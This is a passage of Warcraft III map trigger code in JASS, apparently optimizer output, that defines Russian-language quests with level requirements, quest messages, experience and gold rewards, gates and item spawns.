call TriggerAddAction(aS,function BMk)
endfunction
function BMm takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|C00ffff00Друид-медведь:|r Возвращайтесь. Награда ждать не будет.")
call DestroyEffectBJ(Us[23])
call AddSpecialEffectTargetUnitBJ("overhead",IX,"war3mapImported\\QuestYellow1.mdx")
set Us[23]=GetLastCreatedEffectBJ()
call EnableTrigger(aU)
endfunction
function BMn takes nothing returns nothing
set aT=CreateTrigger()
call TriggerRegisterUnitEvent(aT,Lp,EVENT_UNIT_DEATH)
call TriggerAddAction(aT,function BMm)
endfunction
function BMo takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65646F63) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BMp takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BMq takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BMr takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BMs takes nothing returns boolean
return GetBooleanAnd(BMq(),BMr())
endfunction
function BMt takes nothing returns boolean
return GetBooleanAnd(BMp(),BMs())
endfunction
function BMu takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=15) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=25) then
return false
endif
return true
endfunction
function BMv takes nothing returns nothing
if BMu() then
call AddHeroXP(GetEnumUnit(),2500,false)
else
endif
endfunction
function BMw takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=15) then
return false
endif
return true
endfunction
function BMx takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=15) then
return false
endif
return true
endfunction
function BMy takes nothing returns nothing
if BMx() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call DestroyEffectBJ(Us[23])
call QuestSetCompletedBJ(YX[23],true)
call DestroyQuest(YX[23])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BMt))
call ForGroupBJ(Th,function BMv)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2500 опыта|r, |c00ffff00250 золота|r, |c00ff96963 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BMw() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+750
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+9
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000015|r уровня",.027,255,255,255)
endif
endfunction
function BMz takes nothing returns nothing
set aU=CreateTrigger()
call DisableTrigger(aU)
call TriggerRegisterAnyUnitEventBJ(aU,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aU,Condition(function BMo))
call TriggerAddAction(aU,function BMy)
endfunction
function BM0 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E666F76) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BM1 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=19) then
return false
endif
return true
endfunction
function BM2 takes nothing returns nothing
if BM1() then
call DestroyEffectBJ(Us[24])
call AddSpecialEffectTargetUnitBJ("overhead",I3,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[24]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(aW)
call SetDestructableInvulnerableBJ(G8,true)
call SetDestructableInvulnerableBJ(HB,true)
call SetDestructableInvulnerableBJ(G9,true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Дорога в Ад\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 19-24|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Дорога в Ад","|c006969FFУровень задания: 19-24|r
Один из древних жителей этого мира продал мне свою душу. Чтобы заполучить её, пройдите испытание в небольшом уголке Ада. Вход к испытанию найдете в одинокой палатке в локации пауков.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[24]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000019|r уровня",.027,255,255,255)
endif
endfunction
function BM3 takes nothing returns nothing
set aV=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aV,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aV,Condition(function BM0))
call TriggerAddAction(aV,function BM2)
endfunction
function BM4 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BM5 takes nothing returns nothing
set YV[45]=GetRectCenter(B4)
call SetUnitPositionLoc(GetEnteringUnit(),YV[45])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),GetRectCenter(B4),.5)
call RemoveLocation(YV[45])
endfunction
function BM6 takes nothing returns nothing
set aW=CreateTrigger()
call DisableTrigger(aW)
call TriggerRegisterEnterRectSimple(aW,B5)
call TriggerAddCondition(aW,Condition(function BM4))
call TriggerAddAction(aW,function BM5)
endfunction
function BM7 takes nothing returns nothing
call ModifyGateBJ(bj_GATEOPERATION_OPEN,G8)
endfunction
function BM8 takes nothing returns nothing
set aX=CreateTrigger()
call TriggerRegisterUnitEvent(aX,LL,EVENT_UNIT_DEATH)
call TriggerAddAction(aX,function BM7)
endfunction
function BM9 takes nothing returns nothing
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HB)
endfunction
function BNB takes nothing returns nothing
set aY=CreateTrigger()
call TriggerRegisterUnitEvent(aY,LN,EVENT_UNIT_DEATH)
call TriggerAddAction(aY,function BM9)
endfunction
function BNC takes nothing returns nothing
call ModifyGateBJ(bj_GATEOPERATION_OPEN,G9)
endfunction
function BND takes nothing returns nothing
set aZ=CreateTrigger()
call TriggerRegisterUnitEvent(aZ,LM,EVENT_UNIT_DEATH)
call TriggerAddAction(aZ,function BNC)
endfunction
function BNE takes nothing returns nothing
call EnableTrigger(ab)
call EnableTrigger(ac)
call DestroyEffectBJ(Us[24])
call AddSpecialEffectTargetUnitBJ("overhead",I3,"war3mapImported\\QuestYellow1.mdx")
set Us[24]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Испытание пройдено! Вернитесь за наградой")
call ModifyGateBJ(bj_GATEOPERATION_OPEN,G8)
endfunction
function BNF takes nothing returns nothing
set aa=CreateTrigger()
call TriggerRegisterUnitEvent(aa,LO,EVENT_UNIT_DEATH)
call TriggerAddAction(aa,function BNE)
endfunction
function BNG takes nothing returns nothing
set YV[46]=GetRectCenter(B6)
call SetUnitPositionLoc(GetEnteringUnit(),YV[46])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),GetRectCenter(B6),.5)
call RemoveLocation(YV[46])
endfunction
function BNH takes nothing returns nothing
set ab=CreateTrigger()
call DisableTrigger(ab)
call TriggerRegisterEnterRectSimple(ab,B3)
call TriggerAddAction(ab,function BNG)
endfunction
function BNI takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E666F76) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BNJ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BNK takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BNL takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BNM takes nothing returns boolean
return GetBooleanAnd(BNK(),BNL())
endfunction
function BNN takes nothing returns boolean
return GetBooleanAnd(BNJ(),BNM())
endfunction
function BNO takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=19) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=24) then
return false
endif
return true
endfunction
function BNP takes nothing returns nothing
if BNO() then
call AddHeroXP(GetEnumUnit(),1500,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1500
else
endif
endfunction
function BNQ takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=19) then
return false
endif
return true
endfunction
function BNR takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=19) then
return false
endif
return true
endfunction
function BNS takes nothing returns nothing
if BNR() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ad)
call DestroyEffectBJ(Us[24])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Молодцы! Хвалю. Теперь я смогу подарить Вам душу того существа. Главное - принесите мне его частичку.|r")
call QuestSetCompletedBJ(YX[24],true)
call DestroyQuest(YX[24])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BNN))
call ForGroupBJ(Th,function BNP)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1500 опыта|r, |c00ffff00300 золота|r, |c00ff96966 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BNQ() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+18
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000019|r уровня",.027,255,255,255)
endif
endfunction
function BNT takes nothing returns nothing
set ac=CreateTrigger()
call DisableTrigger(ac)
call TriggerRegisterAnyUnitEventBJ(ac,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ac,Condition(function BNI))
call TriggerAddAction(ac,function BNS)
endfunction
function BNU takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303747))==true) then
return false
endif
return true
endfunction
function BNV takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Вот, только не пораньтесь|r")
set YV[47]=GetRectCenter(B2)
call CreateItemLoc($49303748,YV[47])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303747))
call RemoveLocation(YV[47])
endfunction
function BNW takes nothing returns nothing
set ad=CreateTrigger()
call DisableTrigger(ad)
call TriggerRegisterEnterRectSimple(ad,B2)
call TriggerAddCondition(ad,Condition(function BNU))
call TriggerAddAction(ad,function BNV)
endfunction
function BNX takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F726169) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BNY takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=40) then
return false
endif
return true
endfunction
function BNZ takes nothing returns nothing
if BNY() then
call DestroyEffectBJ(Us[25])
call AddSpecialEffectTargetUnitBJ("overhead",Kk,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[25]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(af)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Смертным тут не место\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 40-45|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Смертным тут не место","|c006969FFУровень задания: 40-45|r
Аха! Вы себя то видели? Куда вы рвётесь? Вас же порвут на куски! Но ежели есть желание - почему бы и нет.... Я с удовольствием посмотрю, как Маркиз будет ковыряться вашими костями у себя в тарелке. Принесите мне Свиток власти, что украл огненный монстр и я позволю вам умереть.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[25]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000040|r уровня",.027,255,255,255)
endif
endfunction
function BNa takes nothing returns nothing
set ae=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ae,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ae,Condition(function BNX))
call TriggerAddAction(ae,function BNZ)
endfunction
function BNb takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303857))==true) then
return false
endif
return true
endfunction
function BNc takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BNd takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BNe takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BNf takes nothing returns boolean
return GetBooleanAnd(BNd(),BNe())
endfunction
function BNg takes nothing returns boolean
return GetBooleanAnd(BNc(),BNf())
endfunction
function BNh takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=40) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=45) then
return false
endif
return true
endfunction
function BNi takes nothing returns nothing
if BNh() then
call AddHeroXP(GetEnumUnit(),5000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3900
else
endif
endfunction
function BNj takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=40) then
return false
endif
return true
endfunction
function BNk takes nothing returns nothing
call DestroyEffectBJ(Us[25])
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Ну что же, встречайте свою смерть!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303857))
call ShowUnitShow(IL)
call QuestSetCompletedBJ(YX[25],true)
call DestroyQuest(YX[25])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BNg))
call ForGroupBJ(Th,function BNi)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF5000 опыта|r, |c00ffff00500 золота|r, |c00ff969610 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BNj() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1500
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BNl takes nothing returns nothing
set af=CreateTrigger()
call DisableTrigger(af)
call TriggerRegisterEnterRectSimple(af,CB)
call TriggerAddCondition(af,Condition(function BNb))
call TriggerAddAction(af,function BNk)
endfunction
function BNm takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68706561) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BNn takes nothing returns boolean
if not (QI[5]==7) then
return false
endif
return true
endfunction
function BNo takes nothing returns boolean
if not (QI[5]==6) then
return false
endif
return true
endfunction
function BNp takes nothing returns boolean
if not (QI[5]==5) then
return false
endif
return true
endfunction
function BNq takes nothing returns boolean
if not (QI[5]==4) then
return false
endif
return true
endfunction
function BNr takes nothing returns boolean
if not (QI[5]==3) then
return false
endif
return true
endfunction
function BNs takes nothing returns boolean
if not (QI[5]==2) then
return false
endif
return true
endfunction
function BNt takes nothing returns boolean
if not (QI[5]==1) then
return false
endif
return true
endfunction
function BNu takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=39) then
return false
endif
return true
endfunction
function BNv takes nothing returns nothing
if BNu() then
set QI[5]=GetRandomInt(1,7)
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(af)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Огонь - друг человека!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 39-42|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Огонь - друг человека!","Этот костер погас! Помогите зажечь его снова...
|c006969FFУровень задания: 39-42|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[26]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[26])
call AddSpecialEffectTargetUnitBJ("overhead",KY,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[26]=GetLastCreatedEffectBJ()
if BNn() then
set YV[48]=GetRectCenter(CK)
call CreateItemLoc($4930385A,GetRectCenter(CK))
call RemoveLocation(YV[48])
else
endif
if BNo() then
set YV[48]=GetRectCenter(CJ)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
if BNp() then
set YV[48]=GetRectCenter(CI)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
if BNq() then
set YV[48]=GetRectCenter(CH)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
if BNr() then
set YV[48]=GetRectCenter(CG)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
if BNs() then
set YV[48]=GetRectCenter(CF)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
if BNt() then
set YV[48]=GetRectCenter(CE)
call CreateItemLoc($4930385A,YV[48])
call RemoveLocation(YV[48])
else
endif
else
call ne(GetTriggerUnit(),"Задание с |c00ff000039|r уровня",.027,255,255,255)
endif
endfunction
function BNw takes nothing returns nothing
set ag=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ag,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ag,Condition(function BNm))
call TriggerAddAction(ag,function BNv)
endfunction
function BNx takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303257) then
return false
endif
return true
endfunction
function BNy takes nothing returns boolean
if not (Sa==3) then
return false
endif
return true
endfunction
function BNz takes nothing returns nothing
set Sa=Sa+1
if BNy() then
call DisableTrigger(ai)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000ff00Все повозки уничтожены
Путь к Фениксу открыт!")
call RemoveUnit(Ii)
call RemoveDestructable(HD)
call RemoveDestructable(HF)
call RemoveDestructable(HC)
call DestroyEffectBJ(Us[32])
else
endif
endfunction
function BN0 takes nothing returns nothing
set ah=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ah,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ah,Condition(function BNx))
call TriggerAddAction(ah,function BNz)
endfunction
function BN1 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930385A))==true) then
return false
endif
return true
endfunction
function BN2 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BN3 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BN4 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BN5 takes nothing returns boolean
return GetBooleanAnd(BN3(),BN4())
endfunction
function BN6 takes nothing returns boolean
return GetBooleanAnd(BN2(),BN5())
endfunction
function BN7 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=39) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=42) then
return false
endif
return true
endfunction
function BN8 takes nothing returns nothing
if BN7() then
call AddHeroXP(GetEnumUnit(),4500,false)
else
endif
endfunction
function BN9 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=39) then
return false
endif
return true
endfunction
function BOB takes nothing returns nothing
call DestroyEffectBJ(Us[26])
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Ура, горит!!!!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930385A))
call CreateItemLoc($4930434B,GetRectCenter(CD))
call AddSpecialEffectLocBJ(GetRectCenter(CC),"Doodads\\Cinematic\\TownBurningFireEmitter\\TownBurningFireEmitter.mdl")
call QuestSetCompletedBJ(YX[26],true)
call DestroyQuest(YX[26])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BN6))
call ForGroupBJ(Th,function BN8)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF4500 опыта|r, |c00ffff00500 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BN9() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1500
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BOC takes nothing returns nothing
set aj=CreateTrigger()
call TriggerRegisterEnterRectSimple(aj,CD)
call TriggerAddCondition(aj,Condition(function BN1))
call TriggerAddAction(aj,function BOB)
endfunction
function BOD takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$756B7467) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BOE takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=26) then
return false
endif
return true
endfunction
function BOF takes nothing returns nothing
if BOE() then
call DestroyEffectBJ(Us[27])
call AddSpecialEffectTargetUnitBJ("overhead",I1,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[27]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(al)
call SetUnitLifePercentBJ(I1,5.)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Свет во мраке\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 26-31|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Свет во мраке","Свою душу владыка Тьмы разделил на три части, и спрятал по разным уголка Кладбища. Одну из частей я отыскал, и отдам Вам её, если вы поможете мне избежать гибели. 
|c006","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[27]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000026|r уровня",.027,255,255,255)
endif
endfunction
function BOG takes nothing returns nothing
set ak=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ak,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ak,Condition(function BOD))
call TriggerAddAction(ak,function BOF)
endfunction
function BOH takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$756B7467) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
if not (GetUnitLifePercent(GetOrderTargetUnit())>=99.) then
return false
endif
return true
endfunction
function BOI takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BOJ takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BOK takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BOL takes nothing returns boolean
return GetBooleanAnd(BOJ(),BOK())
endfunction
function BOM takes nothing returns boolean
return GetBooleanAnd(BOI(),BOL())
endfunction
function BON takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=26) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=31) then
return false
endif
return true
endfunction
function BOO takes nothing returns nothing
if BON() then
call AddHeroXP(GetEnumUnit(),3500,false)
else
endif
endfunction
function BOP takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=29) then
return false
endif
return true
endfunction
function BOQ takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=26) then
return false
endif
return true
endfunction
function BOR takes nothing returns nothing
if BOQ() then
call DestroyEffectBJ(Us[27])
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
set YV[49]=GetRectCenter(CL)
call CreateItemLoc($49303931,YV[49])
call CreateItemLoc($49303931,YV[49])
call CreateItemLoc($49303931,YV[49])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Я буду жить! Держите, что и обещал|r")
call QuestSetCompletedBJ(YX[27],true)
call DestroyQuest(YX[27])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BOM))
call ForGroupBJ(Th,function BOO)
call DestroyGroup(Th)
set Sf=Sf+1
call RemoveLocation(YV[49])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3500 опыта|r, |c00ffff00300 золота|r, |c00ff969610 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BOP() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000026|r уровня",.027,255,255,255)
endif
endfunction
function BOS takes nothing returns nothing
set al=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(al,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(al,Condition(function BOH))
call TriggerAddAction(al,function BOR)
endfunction
function BOT takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E30384C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BOU takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=42) then
return false
endif
return true
endfunction
function BOV takes nothing returns nothing
if BOU() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(an)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Память о бабушке\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 42-45|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Память о бабушке","Бабушка оставила мне в наследство своё ожерелье. А я потеряла его где-то, никак не могу найти... Это украшение очень дорого мне, как память. Помогите, а?
|c006969FFУровень задания|r: 42-45

","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[28]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[28])
call AddSpecialEffectTargetUnitBJ("overhead",IW,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[28]=GetLastCreatedEffectBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000042|r уровня",.027,255,255,255)
endif
endfunction
function BOW takes nothing returns nothing
set am=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(am,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(am,Condition(function BOT))
call TriggerAddAction(am,function BOV)
endfunction
function BOX takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E30384C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
